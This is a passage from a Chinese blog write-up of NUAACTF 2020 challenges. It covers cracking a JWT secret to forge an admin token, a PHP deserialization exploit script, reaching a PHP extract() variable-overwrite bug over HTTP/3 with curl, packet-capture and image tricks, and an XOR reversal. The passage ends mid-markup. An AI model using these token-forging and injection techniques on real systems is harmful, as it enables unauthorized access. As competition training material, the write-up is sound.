href="#web1-checkin" class="headerlink" title="web1-checkin"></a>web1-checkin</h3><p>看源码直接出flag</p><p><img src="/2020/05/30/CTF_2020NUAACTF/image-20200530210037402.png" alt="checkin"></p><blockquote><p>BTW，这个图我最早是在以前的五四评优网站上看到的，现在那个系统已经不再使用了。那时候正好认识了于老板哈哈哈哈。（吹一波！</p></blockquote><h3 id="web2-jwt"><a href="#web2-jwt" class="headerlink" title="web2-jwt"></a>web2-jwt</h3><p>通过工具 <strong>c-jwt-crack</strong> 得到 key</p><p><img src="/2020/05/30/CTF_2020NUAACTF/image-20200530201155492.png" alt="key"></p><p>key:<br><code>NuAa</code></p><p>在线平台构造 jwt</p><p><a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a></p><p><img src="/2020/05/30/CTF_2020NUAACTF/image-20200530201238039.png" alt="jwt"></p><p>得到 JWT</p><pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.SYQ-AGwY5XIcxY621ToK8zEgomHE0Bla9tAUWTLxnwA</code></pre><p>改 jwt 登录 admin 账号即可得到flag。</p><p><img src="/2020/05/30/CTF_2020NUAACTF/image-20200530201535739.png" alt="flag"></p><p>耗几锅锅太强了！</p><h3 id="web3-easypop"><a href="#web3-easypop" class="headerlink" title="web3-easypop"></a>web3-easypop</h3><p>打开题目直接出源码</p><p><img src="/2020/05/30/CTF_2020NUAACTF/haha.png" alt="web3"></p><p><strong>Exp:</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">lemon</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$ClassObj</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ClassObj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">evil</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">lemon</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>把结果直接传参给d，出flag。</p><p><img src="/2020/05/30/CTF_2020NUAACTF/image-20200530205135242.png" alt="web3-flag"></p><br><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="misc1-假笑男孩"><a href="#misc1-假笑男孩" class="headerlink" title="misc1-假笑男孩"></a>misc1-假笑男孩</h3><p><em>gay木的微笑（雾</em></p><p>题目都提示了假笑了，总得看到笑容嘛。</p><p>直接 PNG 改高度就完事了。</p><p><img src="/2020/05/30/CTF_2020NUAACTF/image-20200530182611962.png" alt="laugh"></p><p>于是flag：</p><p><code>flag{i_want_jiamu_power}</code></p><p><strong>我想要嘉木的力量！</strong></p><h3 id="misc2-wireshark"><a href="#misc2-wireshark" class="headerlink" title="misc2-wireshark"></a>misc2-wireshark</h3><p>直接拿 wireshark 打开，找到了一个压缩包，里面有个文件内容就是 flag 呢！</p><p><img src="/2020/05/30/CTF_2020NUAACTF/image-20200530131040440.png" alt="misc2-1"></p><p><img src="/2020/05/30/CTF_2020NUAACTF/image-20200530131016434.png" alt="misc2-2"></p><p><code>nuaactf{wir2sha4k_1s_gReat}</code></p><h3 id="misc3-babyhttp"><a href="#misc3-babyhttp" class="headerlink" title="misc3-babyhttp"></a>misc3-babyhttp</h3><blockquote><p>你知道什么是 HTTP 吗？</p><p>（你通过一般方式是打不开网站的） </p><p>Hint: The newest. </p><p>106.14.153.173 8443</p><p>之后加的 Hint: HTTP发展史</p></blockquote><p>这题看到最新的 HTTP，其实我一开始就猜是 HTTP3（QUIC）了。（果然是陆老板出的题，嘤嘤嘤</p><p>毕竟我这个博客本身就基于 CloudFlare 部署了 HTTP3，只是目前的浏览器支持还不是很好。</p><p><img src="/2020/05/30/CTF_2020NUAACTF/image-20200531005455811.png" alt="http3"></p><p>这题试着用 Chrome 开启 QUIC 进行访问 <a href="https://106.14.154.173:8443" target="_blank" rel="noopener">https://106.14.154.173:8443</a> ，发现被拒绝。用wireshark 抓包也没抓到有关的流量，只看到了 TCP 数据包。</p><p>中途怀疑难道是 HTTP2 的一些罕见方法？于是用 postman 把所有方法都试了一遍，全被拒绝了。</p><p>再回来重新搜了一波 HTTP3 的资料，考虑是<strong>用 curl 来连接</strong>，顺便记录一下，比如下面几个：</p><blockquote><p><a href="https://blog.cloudflare.com/zh/http3-the-past-present-and-future-zh/" target="_blank" rel="noopener">HTTP/3：过去，现在，还有未来</a> （这也是最后给的hint了）</p><p><a href="https://github.com/curl/curl/blob/master/docs/HTTP3.md#quiche-version" target="_blank" rel="noopener">curl  HTTP3 (and QUIC)</a></p><p><a href="http://www.ruanyifeng.com/blog/2019/09/curl-reference.html" target="_blank" rel="noopener">curl 的用法指南（阮一峰）</a></p><p><a href="https://curl.haxx.se/libcurl/c/libcurl-tutorial.html" target="_blank" rel="noopener">libcurl programming tutorial</a></p><p><a href="https://geekflare.com/http3-test/" target="_blank" rel="noopener">How to Test if a Website supports HTTP/3?</a></p><p><a href="https://geekflare.com/curl-installation/" target="_blank" rel="noopener">How to Build and Install latest cURL version on CentOS/RHEL?</a></p><p>网站 HTTP3 部署测试：</p><p><a href="https://gf.dev/http3-test" target="_blank" rel="noopener">HTTP/3 Test, Check if H3/QUIC is enabled on your website</a></p><p><a href="https://www.http3check.net/" target="_blank" rel="noopener">HTTP/3 CHECK</a></p></blockquote><p>然后按照上面的流程<strong>基于 Rust &amp; quiche 来安装 curl</strong>。</p><p>Build quiche and BoringSSL:</p><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> clone --recursive https://github.com/cloudflare/quiche<span class="token function">cd</span> quichecargo build --release --features pkg-config-meta,qlog<span class="token function">mkdir</span> deps/boringssl/lib<span class="token function">ln</span> -vnf <span class="token variable"><span class="token variable">$(</span><span class="token function">find</span> target/release -name libcrypto.a -o -name libssl.a<span class="token variable">)</span></span> deps/boringssl/lib/</code></pre><p>而后 Build curl:</p><pre class=" language-bash"><code class="language-bash"><span class="token function">cd</span> <span class="token punctuation">..</span><span class="token function">git</span> clone https://github.com/curl/curl<span class="token function">cd</span> curl./buildconf./configure LDFLAGS<span class="token operator">=</span><span class="token string">"-Wl,-rpath,<span class="token variable">$PWD</span>/../quiche/target/release"</span> --with-ssl<span class="token operator">=</span><span class="token variable">$PWD</span>/<span class="token punctuation">..</span>/quiche/deps/boringssl --with-quiche<span class="token operator">=</span><span class="token variable">$PWD</span>/<span class="token punctuation">..</span>/quiche/target/release --enable-alt-svc<span class="token function">make</span></code></pre><p>上面 build 过程中需要自行安装 cargo、CMake、Go、autoconf、libtoolize 等依赖，或者根据报错信息相应进行安装就好。（一环套一环，绝了</p><p>比如 CMake 报错找不到 Go：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> apt <span class="token function">install</span> golang</code></pre><p>再比如报错需要 autoconf、libtoolize：</p><p><img src="/2020/05/30/CTF_2020NUAACTF/image-20200531181838258.png" alt="autoconf"></p><p><img src="/2020/05/30/CTF_2020NUAACTF/image-20200531181939936.png" alt="libtoolize"></p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> apt <span class="token function">install</span> autoconf<span class="token function">sudo</span> apt <span class="token function">install</span> libtoolize</code></pre><p>然而国内出口速度不行，在本地在国内的服务器上都试了，装了几个小时 curl 到比赛结束都没装上，代码半天拉不下来。后来直接下载仓库 ZIP 再装，build 还要下载新东西？？？好气啊！做题的时候超想找个 curl 编译有 http3 的小伙伴。。<em>（看来打CTF整个国外VPS来跑很有必要</em></p><p>安装好之后就可以试试了，比如看看版本信息。（要用 build 好的 curl）</p><pre class=" language-bash"><code class="language-bash">./curl --version</code></pre><p>这题 curl 出来是一个web题……</p><pre class=" language-bash"><code class="language-bash">./curl -v https://106.14.153.173:8443  --http3 </code></pre><p><img src="/2020/05/30/CTF_2020NUAACTF/image-20200531184849738.png" alt="一个web题"></p><p>提示访问<code>check.php</code>.</p><pre class=" language-bash"><code class="language-bash">./curl -v https://106.14.153.173:8443/check.php  --http3 </code></pre><p>得到一道题，PHP的。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>code</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#000000</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#0000BB</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token entity" title="&lt;">&amp;lt;</span>?php<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#007700</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>include<span class="token entity" title="&nbsp;">&amp;nbsp;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token style-attr language-css"><span class="token attr-name">            <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#DD0000</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>'flag.php'<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#007700</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token style-attr language-css"><span class="token attr-name">            <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#0000BB</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>error_reporting<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#007700</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>(<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token style-attr language-css"><span class="token attr-name">            <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#0000BB</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#007700</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>);<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>if<span class="token entity" title="&nbsp;">&amp;nbsp;</span>(<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token style-attr language-css"><span class="token attr-name">            <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#0000BB</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>$_SERVER<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#007700</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>[<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token style-attr language-css"><span class="token attr-name">            <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#DD0000</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>"REQUEST_METHOD"<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#007700</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>]<span class="token entity" title="&nbsp;">&amp;nbsp;</span>==<span class="token entity" title="&nbsp;">&amp;nbsp;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token style-attr language-css"><span class="token attr-name">            <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#DD0000</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>"POST"<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token style-attr language-css"><span class="token attr-name">            <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#007700</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>)<span class="token entity" title="&nbsp;">&amp;nbsp;</span>{<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span><span class="token entity" title="&nbsp;">&amp;nbsp;</span><span class="token entity" title="&nbsp;">&amp;nbsp;</span><span class="token entity" title="&nbsp;">&amp;nbsp;</span><span class="token entity" title="&nbsp;">&amp;nbsp;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token style-attr language-css"><span class="token attr-name">            <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#0000BB</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>extract<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#007700</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>(<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token style-attr language-css"><span class="token attr-name">            <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#0000BB</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>$_POST<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token style-attr language-css"><span class="token attr-name">            <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#007700</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>);<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span><span class="token entity" title="&nbsp;">&amp;nbsp;</span><span class="token entity" title="&nbsp;">&amp;nbsp;</span><span class="token entity" title="&nbsp;">&amp;nbsp;</span><span class="token entity" title="&nbsp;">&amp;nbsp;</span>if<span class="token entity" title="&nbsp;">&amp;nbsp;</span>(<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token style-attr language-css"><span class="token attr-name">            <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#0000BB</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>$pass<span class="token entity" title="&nbsp;">&amp;nbsp;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#007700</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>==<span class="token entity" title="&nbsp;">&amp;nbsp;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token style-attr language-css"><span class="token attr-name">            <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#0000BB</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>$newpass<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token style-attr language-css"><span class="token attr-name">            <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#007700</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>)<span class="token entity" title="&nbsp;">&amp;nbsp;</span>{<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span><span class="token entity" title="&nbsp;">&amp;nbsp;</span><span class="token entity" title="&nbsp;">&amp;nbsp;</span><span class="token entity" title="&nbsp;">&amp;nbsp;</span><span class="token entity" title="&nbsp;">&amp;nbsp;</span><span class="token entity" title="&nbsp;">&amp;nbsp;</span><span class="token entity" title="&nbsp;">&amp;nbsp;</span><span class="token entity" title="&nbsp;">&amp;nbsp;</span><span class="token entity" title="&nbsp;">&amp;nbsp;</span>echo<span class="token entity" title="&nbsp;">&amp;nbsp;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token style-attr language-css"><span class="token attr-name">            <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#0000BB</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>$flag<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token style-attr language-css"><span class="token attr-name">            <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#007700</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span><span class="token entity" title="&nbsp;">&amp;nbsp;</span><span class="token entity" title="&nbsp;">&amp;nbsp;</span><span class="token entity" title="&nbsp;">&amp;nbsp;</span><span class="token entity" title="&nbsp;">&amp;nbsp;</span>}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token style-attr language-css"><span class="token attr-name">            <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#0000BB</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>highlight_file<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#007700</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>(<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token style-attr language-css"><span class="token attr-name">            <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#0000BB</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>__FILE__<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#007700</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>);<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>code</span><span class="token punctuation">></span></span></code></pre><p>传入两个参数<code>pass</code>和<code>newpass</code>，让它俩的值相等就行了。</p><pre class=" language-bash"><code class="language-bash">./curl -v https://106.14.153.173:8443/check.php --http3 -d <span class="token string">"pass=1&amp;newpass=1"</span></code></pre><p>然后得到flag：</p><p><code>NUAACTF{WH4T_d0_y0u_kn0w_H334}</code></p><h4 id="另一种-curl-方法"><a href="#另一种-curl-方法" class="headerlink" title="另一种 curl 方法"></a>另一种 curl 方法</h4><p>想到一个方案，就是直接拉别人构建好的 docker 镜像。</p><p>找到了一个 build 有 HTTP3 的 curl docker image：<strong>ymuski/curl-http3</strong></p><blockquote><p>Docker image of <code>curl</code> compiled with  <code>BoringSSL</code> and <code>quiche/0.2.0</code> for <strong>HTTP3 support</strong>, <code>httpstat</code> for visualization.</p><p>GitHub 仓库：<strong><a href="https://github.com/yurymuski/curl-http3" target="_blank" rel="noopener">curl-http3</a></strong></p></blockquote><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># docker run -it --rm ymuski/curl-http3 curl -V</span>curl 7.71.0-DEV <span class="token punctuation">(</span>x86_64-pc-linux-gnu<span class="token punctuation">)</span> libcurl/7.71.0-DEV BoringSSL quiche/0.4.0Release-Date: <span class="token punctuation">[</span>unreleased<span class="token punctuation">]</span>Protocols: dict <span class="token function">file</span> <span class="token function">ftp</span> ftps gopher http https imap imaps pop3 pop3s rtsp smb smbs smtp smtps telnet tftpFeatures: alt-svc AsynchDNS HTTP3 HTTPS-proxy IPv6 Largefile NTLM NTLM_WB SSL UnixSockets</code></pre><p>而后直接做题就完事了。</p><pre class=" language-bash"><code class="language-bash">docker run -it --rm ymuski/curl-http3 curl -Lv https://106.14.153.173:8443/check.php --http3 -d <span class="token string">"pass=a&amp;newpass=a"</span></code></pre><br><hr><h2 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h2><h3 id="rev1-xor"><a href="#rev1-xor" class="headerlink" title="rev1-xor"></a>rev1-xor</h3><p>pyc 反编译（可以利用<a href="https://tool.lu/pyc/" target="_blank" rel="noopener">这个工具</a>）</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flag <span class="token keyword">import</span> flags <span class="token operator">=</span> <span class="token string">'qwertyuiopasdfghjklzxcvbnm1234567890'</span><span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>ord<span class="token punctuation">(</span>s<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> ord<span class="token punctuation">(</span>flag<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">' '</span><span class="token punctuation">,</span> <span class="token operator">**</span>None<span class="token punctuation">)</span></code></pre><p>哇呜，最简单的异或，直接异或回去就完事了。</p><p><strong>Exp:</strong></p><pre class=" language-python"><code class="language-python">encrypted <span class="token operator">=</span> <span class="token string">"31 2 4 19 23 13 19 18 24 31 22 44 29 9 18 55 9 10 2 37 10 6 23 14 2 20 110 86 82 90 86 83 74"</span>s <span class="token operator">=</span> <span class="token string">'qwertyuiopasdfghjklzxcvbnm1234567890'</span>m <span class="token operator">=</span> encrypted<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>m<span class="token operator">=</span>list<span class="token punctuation">(</span>map<span class="token punctuation">(</span>int<span class="token punctuation">,</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>s<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> m<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span></code></pre><p><img src="/2020/05/30/CTF_2020NUAACTF/image-20200530132410728.png" alt="re1"></p><p><code>nuaactf{wow_you_can_really_dance}</code></p><h3 id="rev2-demium"><a href="#rev2-demium" class="headerlink" title="rev2-demium"></a>rev2-demium</h3><blockquote><p>encrypt是flag用medium加密来的，尝试逆向它吧</p></blockquote><p>看了看逆向，好像有点复杂。</p><p>试了一下，发现<code>flag</code>和<code>encrypt.txt</code>中的头4个字母对应的。于是直接借用这个程序建立一个密码映射关系就完事了。</p><p><img 